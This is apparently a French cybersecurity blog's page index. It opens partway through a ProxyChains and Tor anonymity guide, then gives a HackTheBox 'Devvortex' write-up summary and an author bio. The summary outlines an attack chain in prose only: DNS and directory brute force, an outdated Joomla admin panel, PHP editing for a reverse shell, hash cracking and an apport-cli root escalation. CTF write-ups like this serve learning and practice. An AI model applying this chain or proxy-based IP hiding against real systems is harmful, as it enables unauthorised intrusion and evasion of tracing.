Installez ProxyChains-ng : sudo apt install proxychains4 Vérifiez l\u0026rsquo;installation en entrant : proxychains4 Utilisation de ProxyChains #\rPour utiliser ProxyChains, vous devez d\u0026rsquo;abord configurer le fichier de configuration de ProxyChains pour y ajouter vos proxies. Ouvrez le fichier de configuration avec un éditeur de texte :\nsudo nano /etc/proxychains4.conf Ajoutez vos proxies à la fin du fichier en utilisant le format \u0026lt;protocole\u0026gt; \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;. Vous pouvez également configurer la manière dont ProxyChains utilise la liste des proxies (chaînes dynamiques, strictes, round-robin, ou aléatoires).\nIntégration de ProxyChains avec Tor #\rTor (The Onion Router) permet une communication anonyme sur Internet en faisant transiter le trafic à travers plusieurs serveurs opérés par des bénévoles à travers le monde.\nUtilisation de Tor et ProxyChains #\rInstallation de Tor sudo apt install tor Démarrage du service Tor sudo service tor start Assurez-vous que le fichier de configuration de ProxyChains utilise le proxy SOCKS sur le port 9050 (port par défaut de Tor). Ensuite, lancez votre navigateur via ProxyChains :\nproxychains4 firefox Considérations pour l\u0026rsquo;utilisation de ProxyChains #\rPour maximiser l\u0026rsquo;anonymat avec ProxyChains, il est crucial de choisir des proxies fiables et anonymes situés dans différentes régions géographiques. Des listes de proxies gratuits sont disponibles sur des sites comme GitHub, mais il est recommandé de les tester régulièrement pour éviter les proxies défaillants. Des services payants comme Webshare offrent des proxies fiables et anonymes.\nConclusion #\rProxyChains est un outil puissant pour améliorer l\u0026rsquo;anonymat en ligne et contourner les restrictions géographiques. Que vous soyez un professionnel de la cybersécurité ou un utilisateur soucieux de sa confidentialité, ProxyChains offre une flexibilité et une sécurité accrues pour vos activités en ligne. Explorez ses différentes fonctionnalités pour voir comment il peut répondre à vos besoins.\nFoire Aux Questions #\rProxyChains est-il meilleur qu\u0026rsquo;un VPN ? #\rChaque solution a ses avantages. Les VPN encryptent votre trafic via un tunnel, tandis que ProxyChains redirige simplement le trafic à travers plusieurs proxies. Les VPN offrent un niveau de sécurité et de confidentialité plus élevé, mais pas nécessairement l\u0026rsquo;anonymat, puisque le fournisseur de VPN connaît votre identité.\nProxyChains est-il préinstallé sur Kali ? #\rOui, Kali inclut ProxyChains par défaut. Vous pouvez le vérifier avec la commande proxychains4.\nPourquoi les hackers utilisent-ils des serveurs proxy ? #\rLes hackers utilisent des serveurs proxy pour masquer leur adresse IP et leur localisation, rendant leur traçabilité difficile.\nQuelle est la différence entre Tor et ProxyChains ? #\rTor crypte le trafic entre chaque relais de son réseau, tandis que ProxyChains ne fournit pas de cryptage, comptant sur les serveurs proxy pour sécuriser le trafic.\n","date":"23 September 2023","externalUrl":null,"permalink":"/posts/proxychains/","section":"Posts","summary":"Dans le domaine de la cybersécurité et des tests de pénétration (pentesting), l\u0026rsquo;anonymat en ligne est crucial. Les professionnels de la cybersécurité utilisent des outils comme ProxyChains pour masquer leur identité et contourner les restrictions géographiques.","title":"Proxychains Guide","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de répertoire qui mènera sur la découverte d\u0026rsquo;un dashboard admin Joomla obsolète dont l\u0026rsquo;exploitation permettra de trouver des identifiants de connexion. Le dashboard administrateur servira ensuite à éditer des fichiers PHP pour obtenir un reverse shell. Les mêmes identifiants de connexion, seront ensuite utilisés pour avoir accès à un hash MySQL, qu\u0026rsquo;on déchiffrera avec John. La connexion via SSH révèlera ensuite l\u0026rsquo;utilisation d\u0026rsquo;une ancienne version apport-cli, permettant l\u0026rsquo;exécution d\u0026rsquo;un shell root.\n","date":"4 September 2023","externalUrl":null,"permalink":"/posts/htb-devvortex/","section":"Posts","summary":"DevVortex est une machine Linux de niveau easy nécessitant un brute force DNS pour trouver un sous-domaine, suivi d\u0026rsquo;un brute force de répertoire qui mènera sur la découverte d\u0026rsquo;un dashboard admin \u003cstrong\u003eJoomla\u003c/strong\u003e obsolète\u0026hellip;","title":"HTB - Devvortex","type":"posts"},{"content":"","date":"4 September 2023","externalUrl":null,"permalink":"/tags/writups/","section":"Tags","summary":"","title":"Writups","type":"tags"},{"content":"","date":"13 June 2022","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"\rProfile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally. Presently, I work as a Network Security Administrator, where I also delve into penetration testing and actively participate in Hackthebox CTF challenges.\nInterests and Activities My passion for cybersecurity extends beyond my professional role. This blog is a space where I share my experiences, CTF write-ups, and IT-related content. I invite you to explore my posts and join me in the thrilling world of cybersecurity.\nAchievements Throughout my career, I have earned various IT badges, which reflect my commitment to continuously expanding my knowledge and skills. My GitHub profile is a testament to my contributions to the cybersecurity community, showcasing projects and tools I have developed.\nProjects and Tools • Secur\u0026hellip;.\n• Crypt\u0026hellip;.\nContact For business inquiries or to connect with me:\n• LinkedIn: Crispus Houessou\n• Twitter: @0xR4zn\nFeel free to reach out if you have any questions or if you\u0026rsquo;d like to discuss anything related to cybersecurity. Join me on this exciting journey as we navigate the ever-evolving world of cybersecurity together!\n","externalUrl":null,"permalink":"/about/","section":"Raizen | Blog","summary":"Profile Originally from Benin, I am currently a Cybersecurity student with a Bachelor of Science in Network Security. My journey in cybersecurity has taken me to exciting places, both professionally and personally.","title":"About","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]